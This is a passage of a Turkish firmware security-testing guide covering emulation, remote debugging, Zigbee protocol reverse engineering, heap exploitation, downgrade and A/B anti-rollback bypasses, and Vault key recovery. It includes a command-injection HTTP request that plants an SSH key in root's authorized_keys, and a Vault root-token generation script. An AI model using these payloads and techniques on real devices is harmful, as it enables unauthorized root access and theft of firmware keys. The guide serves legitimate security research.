sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için zaman damgalı işaretçi dosyalarını kararlı, yazılabilir bir birime yazın ve çevrimdışı doğrulayın; `/dev/kmsg`, FIFO’lar ve geçici konsollar, hız sınırlaması veya süreçlerin erken sonlanması nedeniyle hatalı negatif sonuçlara yol açabilir. Ayrıca ilgisiz kodu değiştirmeden önce katmanlar arasındaki arabirimlerin tam olarak eşleştiğini kontrol edin: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile çekirdek yapılandırması ve Mesa `libGL` nesli ile DRI sürücüsü ABI’si ve PCI’dan türetilen sürücü adları. Bir bileşen mevcut olabilir, hatta `dlopen()` ile başarıyla yüklenebilir; ancak onu kullanan bileşen farklı bir ABI beklediğinden kullanılamaz durumda kalabilir.<sup>[[11]](#references)</sup>

## Uygulamada Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. İşletim sistemine ve dosya sistemine kabuk erişimini sürdürmek esastır. Emülasyon donanım etkileşimlerini tam olarak taklit edemeyebilir; bu nedenle emülasyonu zaman zaman yeniden başlatmak gerekebilir. Analizde dosya sistemi yeniden incelenmeli, dışa açık web sayfalarından ve ağ hizmetlerinden yararlanılmalı, önyükleyici güvenlik açıkları araştırılmalıdır. Olası arka kapı güvenlik açıklarını belirlemek için firmware bütünlük testleri kritik önemdedir.

## Çalışma Zamanı Analiz Teknikleri

Çalışma zamanı analizi; kesme noktaları ayarlamak ve fuzzing ile diğer teknikler aracılığıyla güvenlik açıklarını belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçları kullanarak bir süreç veya ikili dosyayla kendi çalışma ortamında etkileşim kurmayı içerir.

Tam bir hata ayıklayıcısı bulunmayan gömülü hedeflerde, **statik olarak bağlanmış bir `gdbserver` dosyasını** cihaza kopyalayın ve cihaza uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radyo yardımcı işlemci mesaj eşleme

IoT hub’larda RF stack çoğu zaman bir **radyo MCU** ile Linux userland process arasında bölünür. Yararlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havadaki **RF frame**
2. Radyo MCU üzerindeki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon’daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek hedef yerine iki reverse engineering hedefi oluşturur. Controller, binary radyo frame’lerini `Group,Command,arg1,arg2,...` gibi metin tabanlı bir protocol’e dönüştürüyorsa şunları bulun:

- **Message group** ve dispatch tabloları
- Hangi mesajların **network** üzerinden, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field** değerleri (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebilen handler’lar

Özellikle Zigbee için eşleştirme trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine dayanıp dayanmadığını kontrol edin. Öyleyse commissioning trafiğini dinlemek **Network Key**’i açığa çıkarabilir. Zigbee 3.0 install code’ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Üreticiye özel protocol handler’ları ve FSM ile kısıtlanan erişilebilirlik

Üreticiye özel Zigbee/ZCL komutları, standart cluster’lardan çoğu zaman daha iyi bir hedeftir; çünkü daha az sınanmış doğrulamaya sahip **custom parsing code** ve dahili **FSM**’lere ulaşırlar.<sup>[[8]](#references)</sup>

Pratik iş akışı:

- **Vendor-only handler**’ı bulana kadar command dispatcher’ı reverse engineer edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** tablolarını çıkarın.
- Otomatik olarak ilerleyen **transitional state**’leri ve saldırganın kontrolündeki state’i sıfırlayan veya serbest bırakan retry/error branch’lerini belirleyin.
- Hatalı handler’ın her zaman erişilebilir olduğunu varsaymak yerine, daemon’ı savunmasız duruma getirmek için gereken meşru protocol alışverişlerini doğrulayın.

Zamanlamaya duyarlı protocol’lerde, bir Python framework’ünden packet replay yapmak fazla yavaş olabilir. Daha güvenilir bir yöntem, doğru **endpoint**’leri, **attribute**’ları ve commissioning zamanlamasını sağlayabilmek için vendor-grade stack kullanan gerçek donanım (örneğin **nRF52840**) üzerinde meşru bir cihazı taklit etmektir.

### Embedded daemon’larda parçalı indirme hatası sınıfı

Firmware’de tekrar tekrar görülen bir hata sınıfı, **parçalı blob/model/configuration indirmelerinde** ortaya çıkar:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` çağrısıyla bellek ayırır.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi saldırganın kontrolündeki **packet-local** alanları doğrular.
3. Kopyalama işlemi, **ilk ayrılan boyuta** karşı kontrol yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` çağrısını kullanır.

Bu, saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation oluşturmak için **küçük** bir toplam boyut belirten, geçerli ilk fragment.
- **Beklenen offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment.
- Yeni kontrolleri geçerken ilk ayrılan buffer’ı taşıran, sahte bir packet-local boyut.

Savunmasız yol commissioning logic’in arkasındaysa, bozuk fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download state’ine geçirmek için istismara yeterli **device emulation** eklenmelidir.

### Protocol ile tetiklenen `free()` işlemleri

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu çoğu zaman “temizliği beklemek” değil, **protocol’ün kendi error handling mekanizmasını zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** state’lerine geçirmek için bozuk follow-up fragment’ler gönderin.
- Retry eşiğini aşarak daemon’ın context’i **sıfırlamasını** ve bozulmuş buffer’ı serbest bırakmasını sağlayın.
- Process ilgisiz nedenlerle çökmeden önce allocator tarafındaki primitive’leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu, özellikle embedded Linux’taki **musl/uClibc/dlmalloc benzeri** allocator’lara karşı yararlıdır; burada chunk metadata’sını bozmak, unlink/unbin logic’ini bir write primitive’e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer’larını doğrudan bozup process’i çökertmek yerine, allocator traversal’ını taşırılmış buffer içinde yerleştirilmiş **fake chunk**’lara yönlendirmek için bir **size field**’ı bozmaktır.

## Binary Exploitation ve Proof-of-Concept

Belirlenen güvenlik açıkları için PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded system’lerde binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin istismarı notları (embedded Linux)

- **Fastbin’ler + consolidation:** uClibc, glibc’ye benzer fastbin’ler kullanır. Sonraki büyük bir allocation `__malloc_consolidate()` fonksiyonunu tetikleyebilir; bu nedenle her fake chunk kontrolleri geçmelidir (makul bir size, `fd = 0` ve çevredeki chunk’ların “in use” olarak görülmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary’ler:** ASLR etkin olsa bile ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation’ını bir **function pointer table** üzerine yönlendirmek için geçerli bir heap chunk header’ına benzeyen bir bölge hedeflenebilir.
- **Parser’ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, sondaki saldırgan kontrollü byte’ları stack pivot/ROP chain için korurken parsing’i durdurabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, bilinen bir memory mapping’e çalıştırılabilir shellcode yerleştirip oraya atlayabilir.

## Firmware Analizi için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Firmware’i analiz etmek için hazır işletim sistemleri

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının güvenlik değerlendirmesini ve penetration testing’ini yapmanıza yardımcı olmayı amaçlayan bir dağıtımdır. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sunarak size önemli ölçüde zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware Downgrade Saldırıları ve Güvenli Olmayan Update Mekanizmaları

Bir üretici firmware image’ları için cryptographic signature kontrolleri uygulasa bile **version rollback (downgrade) koruması** sıklıkla atlanır. Boot veya recovery loader, yalnızca gömülü bir public key ile signature’ı doğruluyor ancak yüklenecek image’ın *version* değerini (veya monotonic counter’ını) karşılaştırmıyorsa saldırgan, geçerli bir signature’ı hâlâ taşıyan **daha eski ve savunmasız bir firmware’i** meşru şekilde yükleyebilir ve böylece yamalanmış güvenlik açıklarını yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir image edinin**
   * Üreticinin herkese açık indirme portalından, CDN’inden veya destek sitesinden alın.
   * Companion mobile/desktop application’lardan çıkarın (örneğin bir Android APK içindeki `assets/firmware/` dizininden).
   * VirusTotal, Internet archive’ları, forumlar vb. üçüncü taraf depolardan alın.
2. Image’ı açık olan update channel’larından biri aracılığıyla cihaza **yükleyin veya sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok tüketici IoT cihazında, Base64 ile kodlanmış firmware blob’larını kabul eden, bunları server tarafında çözüp recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint’leri bulunur.
3. Downgrade sonrasında, daha yeni sürümde yamalanmış bir güvenlik açığından yararlanın (örneğin sonradan eklenen bir command-injection filter).
4. İsteğe bağlı olarak, persistence elde ettikten sonra tespit edilmemek için en güncel image’ı yeniden yükleyin veya update’leri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Güvenlik açığı bulunan (eski sürüme düşürülmüş) firmware'de, `md5` parametresi herhangi bir temizlemeden doğrudan bir shell komutuna ekleniyor ve böylece istenen komutların enjekte edilmesine olanak tanıyor (burada SSH anahtarıyla root erişimi sağlanıyor). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak downgrade korumasının olmaması bu düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını yardımcı mobil uygulamalarının içine ekler. Bu paketler genellikle APK/APEX dosyasında `assets/fw/` veya `res/raw/` gibi yollarda şifrelenmemiş olarak saklanır. `apktool`, `ghidra` veya yalnızca `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı imajları çıkarmanızı sağlar.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater üzerinden anti-rollback atlatma

Bazı üreticiler anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığı içinde yapar (örneğin CAN üzerinden bir UDS rutini, recovery komutu veya userspace OTA agent). Daha sonra **bootloader** yalnızca image imzasını/CRC’sini kontrol eder ve partition table’a ya da slot metadata’sına güvenirse rollback koruması yine de atlatılabilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata’sı hem bir sürüm tanımlayıcısı hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini kalıcı depolamadaki bir değerle karşılaştırır ve daha eski imzalı image’ları reddeder.
- Bootloader bu ratchet’i **ayrıştırmaz**; seçili slot’u başlatmadan önce yalnızca header’ı, CRC’yi ve imzayı doğrular.
- Slot etkinleştirme bilgisi ayrı olarak bir partition table’da veya slot başına generation counter’da tutulur ve doğrulanan firmware’in tam digest’ine **kriptografik olarak bağlanmamıştır**.

Bu durum, dual-slot sistemlerde **bir image’ı doğrula / başka bir image’ı başlat** primitive’i oluşturur. Saldırgan, updater’a güncel imzalı bir image kullanarak B slot’unu sonraki boot hedefi olarak işaretletebilir ve yeniden başlatmadan önce B slot’unu üzerine yazabilirse bootloader, yalnızca önceden kaydedilmiş slot metadata’sına güvendiği için yine de downgrade edilmiş image’ı başlatabilir.

Yaygın istismar yöntemi:

1. **Güncel imzalı** bir firmware’i pasif slot’a yükleyin ve normal doğrulama/değiştirme rutinini çalıştırarak layout’un bu slot’u sonraki etkin slot olarak işaretlemesini sağlayın.
2. **Henüz yeniden başlatmayın**. Aynı oturumda slot hazırlama/silme rutinine yeniden girin.
3. Updater’ın, güncel kaydedilmiş layout yerine eski duruma göre hareket etmesini sağlayan eski boot-state veya slot-selection mantığını istismar ederek az önce etkinleştirilmiş **aynı fiziksel slot’u** sildirin.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet’i uygulayan doğrulama rutinini atlayın ve doğrudan yeniden başlatın.
6. Bootloader etkinleştirilmiş slot’u seçer, yalnızca imzayı/bütünlüğü doğrular ve eski image’ı başlatır.

A/B update uygulamalarını incelerken dikkat edilmesi gerekenler:

- Slot seçiminin, başarılı bir değişiklikten sonra yenilenmeyen **boot-time flags** üzerinden yapılması.
- **Güncel kaydedilmiş layout** yerine eski duruma göre slot silen `prepare_passive_slot()` tarzı bir rutin.
- Doğrulanmış image hash’ini kaydetmeyip yalnızca **generation counter** / active flag değerini artıran `part_write_layout()` tarzı bir fonksiyon.
- Ratchet kontrollerinin userspace veya updater kodunda uygulanması, ancak ROM / bootloader / secure boot aşamalarında **uygulanmaması**.
- İçeriği silinip yeniden yazıldıktan sonra slot’u başlatılabilir olarak işaretli bırakan silme veya recovery rutinleri.

### Update Mantığını Değerlendirme Kontrol Listesi

* *Update endpoint*’inin taşıma katmanı/kimlik doğrulaması yeterince korunuyor mu (TLS + authentication)?
* Cihaza firmware yazılmadan önce **sürüm numaraları** veya **monotonic anti-rollback counter** karşılaştırılıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. imzalar ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca imza/CRC kontrolü yapmak yerine updater ile **aynı ratchet’i** uygulıyor mu?
* Slot etkinleştirme metadata’sı **doğrulanmış firmware digest/sürümüne bağlı mı**, yoksa etkinleştirildikten sonra bir slot değiştirilebilir mi?
* Slot değişikliği başarılı olduktan sonra cihaz yeniden başlatılmaya zorlanıyor mu, yoksa aynı oturumda sonraki update/silme rutinlerine erişilebiliyor mu?
* Userland kodu ek tutarlılık kontrolleri yapıyor mu (ör. izin verilen partition map, model numarası)?
* *Kısmi* veya *yedek* update akışları aynı doğrulama mantığını yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware’ler

Firmware’deki güvenlik açıklarını bulma pratiği yapmak için başlangıç noktası olarak aşağıdaki savunmasız firmware projelerini kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault durumundan firmware şifre çözme anahtarlarını kurtarma

Bir update image’ı az miktarda düz metin metadata’sını büyük ve yüksek entropili bir blob ile birleştiriyorsa, herhangi bir brute-force denemeden önce container triage yapın:<sup>[[1]](#references)</sup>

- Header’ları, offset’leri ve satır sınırlarını `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dökün.
- `Salted__` genellikle OpenSSL `enc` formatına işaret eder: sonraki 8 byte salt, geri kalan byte’lar ise ciphertext’tir.
- Tam olarak `256` byte’a çözülen bir Base64 alanı, rastgele bir firmware parolası/session key’i sarmalayan RSA-2048 ciphertext’iyle karşı karşıya olduğunuzun güçlü bir göstergesidir.
- Aynı dosyadaki detached PGP materyali genellikle yalnızca özgünlüğü korur; bunun gizliliği sağlayan mekanizma olduğunu varsaymayın.

Statik anahtar araması (`grep`, `strings`, PEM/PGP aramaları) sonuç vermezse yalnızca private key aramak yerine **operasyonel decrypt yolunu** tersine inceleyin:

- Updater / yönetim binary’sini decompile edin ve şifrelenmiş blob’u kimin okuduğunu, hangi helper/API’nin blob’u çözdüğünü ve hangi mantıksal anahtar adının istendiğini izleyin.
- Çıkarılmış root filesystem’da KMS durumunu (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ve unit dosyaları ile init script’lerini arayın.
- Düz metin `vault operator unseal ...` komutlarını, recovery key’leri, bootstrap token’larını veya yerel KMS auto-unseal script’lerini private-key materyaliyle eşdeğer kabul edin.

Cihaz orijinal Vault binary’si ve storage backend’iyle birlikte geliyorsa bu ortamı yeniden çalıştırmak genellikle Vault iç işleyişini yeniden uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root erişiminiz olduğunda:

- Transit key'leri yalnızca izole klonda export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'i, KMS'nin kullandığı tam padding/hash çiftiyle deneyin. PKCS#1 v1.5 decrypt işleminin ve varsayılan OAEP decrypt işleminin başarısız olması, key'in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 kullanan OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işlemine geçmeden önce vendor'ın OpenSSL KDF'sini (`EVP_BytesToKey`, eski cihazlarda çoğunlukla MD5) tam olarak yeniden uygulayın.

Bu, "şifrelenmiş firmware" konusunu daha genel bir probleme dönüştürür: **cihaz tarafındaki operasyonel key'leri kurtarın, ardından unwrap + KDF parametrelerini offline olarak tam biçimde yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Cracking: Kıdemli Seviye Beceri, Junior Seviyesinde Otonomi](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnternetine Saldırı İçin Kesin Rehber](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımdaki zero-day'lerden yararlanma – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Akıllı Bir Cihaz Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi Beni Görüyorsun: Şimdi Pwned Oldun](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ın şarj portu konektörü üzerinden istismar edilmesi - Bölüm 2: anti-downgrade mekanizmasının atlatılması](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Işığı Yak: Philips Hue Bridge'in Over-the-Air İstismarı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU'da Tesla OS'a ROOT Erişimi - Bölüm 1: Paketin Açılması](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel belgeleri - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU'da Tesla OS'a ROOT Erişimi - Bölüm 2: Debugging ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Parolaları: Zayıf XOR Şifrelemesi SPI Flash'tan Kurtarmaya Olanak Tanıyor (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS parola kurtarma araçları](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
